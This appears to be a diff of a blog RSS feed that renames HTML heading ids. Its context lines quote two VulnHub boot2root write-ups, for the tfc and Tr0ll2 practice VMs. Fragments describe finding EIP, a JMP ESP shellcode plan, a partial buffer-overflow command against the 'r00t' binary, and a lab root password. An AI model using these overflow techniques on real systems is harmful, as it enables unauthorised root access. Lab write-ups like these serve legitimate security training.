 &lt;p&gt;&lt;em&gt;For this part, I have to give a &lt;strong&gt;big&lt;/strong&gt; high five to &lt;a href=&#34;https://twitter.com/recrudesce&#34;&gt;@recrudesce&lt;/a&gt; for helping me understand parts of the pseudo code.&lt;/em&gt;&lt;/p&gt;
 
@@ -7859,7 +7859,7 @@ while ((arg_4 &amp;amp; 0x3) &amp;gt; var_4) {
 return 0x0;
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;the-encryption-logic-replicated:1122ba630e8da20bb861d870e35485fa&#34;&gt;the encryption logic replicated&lt;/h2&gt;
+&lt;h2 id=&#34;the-encryption-logic-replicated&#34;&gt;the encryption logic replicated&lt;/h2&gt;
 
 &lt;p&gt;While I was working through the pseudo code, I was writing the python script. You will notice it replicates the pseudo code logic almost exactly, except for the fact that we are not passing the content by reference, but instead build a new string with the encrypted version of the content in it. The script resulted in:&lt;/p&gt;
 
@@ -7945,7 +7945,7 @@ if __name__ == &#39;__main__&#39;:
 
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;testing-the-script:1122ba630e8da20bb861d870e35485fa&#34;&gt;testing the script&lt;/h2&gt;
+&lt;h2 id=&#34;testing-the-script&#34;&gt;testing the script&lt;/h2&gt;
 
 &lt;p&gt;With the script done I obviously had to test it. I have a buffer of 1000 &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s as the content and redirected the script output to a file:&lt;/p&gt;
 
@@ -7964,7 +7964,7 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 &lt;p&gt;So to recap. We generated a file &lt;code&gt;test.tfc&lt;/code&gt;, which is the encrypted version of 1000 &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s. We then ran it through &lt;code&gt;tfc&lt;/code&gt; which decrypted it to our cleartext &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s again.&lt;/p&gt;
 
-&lt;h2 id=&#34;finding-eip:1122ba630e8da20bb861d870e35485fa&#34;&gt;finding EIP&lt;/h2&gt;
+&lt;h2 id=&#34;finding-eip&#34;&gt;finding EIP&lt;/h2&gt;
 
 &lt;p&gt;With the ability of generating encrypted files of any length now, we had everything we needed to find EIP from the previously suspected stack overflow. Worst case, we can have a clean buffer of &lt;code&gt;41&lt;/code&gt;&amp;rsquo;s to work with in a debugger. So the next run, I changed the content to 6000 &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s, and ran it through &lt;code&gt;gdb&lt;/code&gt; to be able to inspect the Segmentation Fault that occurs.&lt;/p&gt;
 
@@ -8033,7 +8033,7 @@ gdb-peda$
 
 &lt;p&gt;This resulted in a crash at &lt;code&gt;0x42424242&lt;/code&gt; in &lt;code&gt;gdb&lt;/code&gt; which was perfect!&lt;/p&gt;
 
-&lt;h2 id=&#34;exploiting-tfc:1122ba630e8da20bb861d870e35485fa&#34;&gt;exploiting tfc&lt;/h2&gt;
+&lt;h2 id=&#34;exploiting-tfc&#34;&gt;exploiting tfc&lt;/h2&gt;
 
 &lt;p&gt;The only thing that was left to do was to find a &lt;code&gt;JMP ESP&lt;/code&gt; instruction we could jump to, and add some shell code on to the stack. Since the binary compiled with &lt;code&gt;NO NX&lt;/code&gt;, it should happily execute code on it.&lt;/p&gt;
 
@@ -8101,7 +8101,7 @@ root password is &amp;quot;qVx4UJ*zcUdc9#3C$Q&amp;quot;, but you should already 
 
 &lt;p&gt;There are a number other goodies in /root to check out so be sure to do that!&lt;/p&gt;
 
-&lt;h2 id=&#34;conclusion:1122ba630e8da20bb861d870e35485fa&#34;&gt;conclusion&lt;/h2&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;
 
 &lt;p&gt;Big shoutout to &lt;a href=&#34;https://twitter.com/zer0w1re&#34;&gt;@zer0w1re&lt;/a&gt; for the VM and as always &lt;a href=&#34;https://twitter.com/vulnhub&#34;&gt;@VulnHub&lt;/a&gt; for the hosting. The learning experience has been invaluable! :)&lt;/p&gt;
 </description>
@@ -8115,13 +8115,13 @@ root password is &amp;quot;qVx4UJ*zcUdc9#3C$Q&amp;quot;, but you should already 
       <guid>https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/</guid>
       <description>
 
-&lt;h2 id=&#34;foreword:ff2d6ad4b47b6fd6836c2e3c0a90356f&#34;&gt;foreword&lt;/h2&gt;
+&lt;h2 id=&#34;foreword&#34;&gt;foreword&lt;/h2&gt;
 
 &lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/tr0ll-2,107/&#34;&gt;Tr0ll2&lt;/a&gt; is a successor in a boot2root series by &lt;a href=&#34;https://twitter.com/Maleus21&#34;&gt;@Maleus21&lt;/a&gt; hosted over at &lt;a href=&#34;http://vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt;. Having been able to &lt;a href=&#34;https://leonjza.github.io/blog/2014/08/15/taming-the-troll/&#34;&gt;pwn Tr0ll1&lt;/a&gt;, I gave this one a shot too.&lt;/p&gt;
 
 &lt;p&gt;Here is my experience taming the troll, again.&lt;/p&gt;
 
-&lt;h2 id=&#34;getting-started:ff2d6ad4b47b6fd6836c2e3c0a90356f&#34;&gt;getting started&lt;/h2&gt;
+&lt;h2 id=&#34;getting-started&#34;&gt;getting started&lt;/h2&gt;
 
 &lt;p&gt;Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a &lt;code&gt;nmap&lt;/code&gt; against it:&lt;/p&gt;
 
@@ -8144,7 +8144,7 @@ Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds
 
 &lt;p&gt;ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for &lt;em&gt;vsftpd 2.0.8 exploit&lt;/em&gt; with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren&amp;rsquo;t any strange banners etc to be found which was not the case.&lt;/p&gt;
 
-&lt;h2 id=&#34;web-server:ff2d6ad4b47b6fd6836c2e3c0a90356f&#34;&gt;web server&lt;/h2&gt;
+&lt;h2 id=&#34;web-server&#34;&gt;web server&lt;/h2&gt;
 
 &lt;p&gt;Opening up a browser to &lt;a href=&#34;http://192.168.56.101&#34;&gt;http://192.168.56.101&lt;/a&gt; revealed a familiar image:&lt;/p&gt;
 
@@ -8268,7 +8268,7 @@ AM
 
 &lt;p&gt;My guess was that this has to be a password for either the FTP or SSH service.&lt;/p&gt;
 
-&lt;h2 id=&#34;ftpee:ff2d6ad4b47b6fd6836c2e3c0a90356f&#34;&gt;ftpee&lt;/h2&gt;
+&lt;h2 id=&#34;ftpee&#34;&gt;ftpee&lt;/h2&gt;
 
 &lt;p&gt;I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.&lt;/p&gt;
 
@@ -8334,7 +8334,7 @@ ftp&amp;gt; bye
 221 Goodbye.
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;noob-key:ff2d6ad4b47b6fd6836c2e3c0a90356f&#34;&gt;noob key&lt;/h2&gt;
+&lt;h2 id=&#34;noob-key&#34;&gt;noob key&lt;/h2&gt;
 
 &lt;p&gt;We find ourselves with a zip archive called &lt;code&gt;lmao.zip&lt;/code&gt;. A encrypted one :(&lt;/p&gt;
 
@@ -8383,7 +8383,7 @@ TRY HARDER LOL!
 Connection to 192.168.56.101 closed.
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;shocking-isn-t-it:ff2d6ad4b47b6fd6836c2e3c0a90356f&#34;&gt;shocking isn&amp;rsquo;t it&lt;/h2&gt;
+&lt;h2 id=&#34;shocking-isn-t-it&#34;&gt;shocking isn&amp;rsquo;t it&lt;/h2&gt;
 
 &lt;p&gt;Surprise surprise. It seemed like we are in fact authenticating, but we don&amp;rsquo;t have a shell. I figured one of two things could be happening here. First, the &lt;code&gt;.bashrc&lt;/code&gt; may have been modified with something that echoes the text &lt;code&gt;TRY HARDER LOL!&lt;/code&gt; and exits, or there is some restriction on the SSH key for &lt;code&gt;noob&lt;/code&gt;.&lt;/p&gt;
 
@@ -8398,7 +8398,7 @@ uid=1002(noob) gid=1002(noob) groups=1002(noob)
 
 &lt;p&gt;Shocking :) To confirm, the &lt;code&gt;authorized_keys&lt;/code&gt; file has the entry &lt;code&gt;command=&amp;quot;echo TRY HARDER LOL!&amp;quot;&lt;/code&gt; before the public key.&lt;/p&gt;
 
-&lt;h2 id=&#34;which-door-leads-to-r00t:ff2d6ad4b47b6fd6836c2e3c0a90356f&#34;&gt;which door leads to r00t&lt;/h2&gt;
+&lt;h2 id=&#34;which-door-leads-to-r00t&#34;&gt;which door leads to r00t&lt;/h2&gt;
 
 &lt;p&gt;With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory &lt;code&gt;/nothing_to_see_here&lt;/code&gt;.&lt;/p&gt;
 
@@ -8452,7 +8452,7 @@ Connection to 192.168.56.101 closed.
 
 &lt;p&gt;This was only a minor annoyance and I had enough time to check out the binaries using &lt;code&gt;od&lt;/code&gt; to figure out which one I should be looking at. The other binary that would have been a problem appears to chmod /bin/ls so that it becomes unusable. Lucky I missed that one.&lt;/p&gt;
 
-&lt;h2 id=&#34;bof-bof-bof-your-boat:ff2d6ad4b47b6fd6836c2e3c0a90356f&#34;&gt;bof bof bof your boat&amp;hellip;&lt;/h2&gt;
+&lt;h2 id=&#34;bof-bof-bof-your-boat&#34;&gt;bof bof bof your boat&amp;hellip;&lt;/h2&gt;
 
 &lt;p&gt;I copied the binary of interest to &lt;code&gt;/tmp&lt;/code&gt; so that I wont be bothered by the shuffling thing that was going on again. Most importantly the one of interest was slightly bigger in size compared to the others so it was easy to identify it apart from the others.&lt;/p&gt;
 
@@ -8494,7 +8494,7 @@ noob@Tr0ll2:/tmp$ ldd ./r00t
 &lt;p&gt;Both entries returned the same address for libc, indicating that ASLR was not enabled :)
 Tr0ll2 was also nice enough to include &lt;code&gt;gdb&lt;/code&gt;, making the exploit development process very easy.&lt;/p&gt;
 
-&lt;h2 id=&#34;the-exploit:ff2d6ad4b47b6fd6836c2e3c0a90356f&#34;&gt;the exploit&lt;/h2&gt;
+&lt;h2 id=&#34;the-exploit&#34;&gt;the exploit&lt;/h2&gt;
 
 &lt;p&gt;With all of the information gathered so far about this particularly interesting &lt;code&gt;r00t&lt;/code&gt; binary, it was time to quickly write the overflow exploit to attempt and spawn us a root shell.&lt;/p&gt;
 
@@ -8649,7 +8649,7 @@ noob@Tr0ll2:/tmp$ ./r00t $(python -c &#39;print &amp;quot;A&amp;quot; *268 + &am
 $
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;trollin-the-rootin:ff2d6ad4b47b6fd6836c2e3c0a90356f&#34;&gt;trollin the rootin&lt;/h2&gt;
+&lt;h2 id=&#34;trollin-the-rootin&#34;&gt;trollin the rootin&lt;/h2&gt;
 
 &lt;p&gt;So &lt;code&gt;0xbfffff06&lt;/code&gt; as a EGG location will give us shell in our testing! To finish off then, I have to find the correct &lt;code&gt;r00t&lt;/code&gt; binary in all of the &lt;code&gt;door{1,2,3}&lt;/code&gt; folders and attempt my exploit there:&lt;/p&gt;
 
